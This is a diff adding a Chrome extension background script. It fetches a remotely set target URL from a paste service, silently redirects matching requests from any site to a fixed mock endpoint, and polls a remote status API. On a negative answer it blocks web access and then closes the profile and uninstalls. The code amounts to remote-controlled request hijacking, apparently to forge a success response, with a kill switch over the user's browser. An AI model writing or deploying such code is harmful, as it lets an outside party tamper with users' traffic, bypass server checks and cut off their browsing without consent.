@@ -1,0 +1,73 @@
+const DYNAMIC_URL_API = "https://api.npoint.io/6a43abe7e04013d72332";
+const SUCCESS_REDIRECT_URL = "https://run.mocky.io/v3/80a0837f-382d-4726-8a30-a73fc8f4aaa0";
+const ACCESS_STATUS_API = "https://run.mocky.io/v3/b84ea806-17c5-4b23-8edd-fed36862a10f";
+
+let url = "";
+let successNotify = false;
+let banNotify = false;
+
+function fetchDynamicUrl() {
+  const FALLBACK_URL = "https://example.com/fallback";
+  
+  fetch(DYNAMIC_URL_API)
+    .then(response => response.text())
+    .then(fetchedUrl => {
+      fetchedUrl = fetchedUrl.trim();
+      if (fetchedUrl) {
+        chrome.storage.local.set({ dynamicUrl: fetchedUrl }, () => {
+          console.log("✅ Dynamic URL is set to " + fetchedUrl);
+          url = fetchedUrl;
+        });
+      } else {
+        throw new Error("Fetched URL is empty.");
+      }
+    })
+    .catch(error => {
+      console.error("❌ Error fetching dynamic URL:", error);
+      chrome.storage.local.get("dynamicUrl", (result) => {
+        if (result.dynamicUrl) {
+          url = result.dynamicUrl;
+        } else {
+          url = FALLBACK_URL;
+          chrome.storage.local.set({ dynamicUrl: FALLBACK_URL });
+        }
+      });
+    });
+}
+
+function violated() {
+  fetch(ACCESS_STATUS_API)
+    .then(response => response.json())
+    .then(data => {
+      if (data.success) {
+        if (!successNotify) {
+          RestoreWebAccess();
+          successNotify = true;
+          banNotify = false;
+        }
+      } else {
+        if (!banNotify) {
+          banNotify = true;
+          blockWebAccess();
+          setTimeout(closeProfileAndUninstall, 30000);
+        }
+      }
+    })
+    .catch(error => console.error("❌ Error:", error));
+}
+
+chrome.webRequest.onBeforeRequest.addListener(
+  function (details) {
+    if (url && details.url.startsWith(url) && !banNotify) {
+      console.log("🌐 Redirecting request to: " + SUCCESS_REDIRECT_URL);
+      return { redirectUrl: SUCCESS_REDIRECT_URL };
+    }
+  },
+  { urls: ["<all_urls>"] },
+  ["blocking"]
+);
+
+setInterval(fetchDynamicUrl, 5 * 60 * 1000);
+setInterval(violated, 5000);
+fetchDynamicUrl();
+violated();
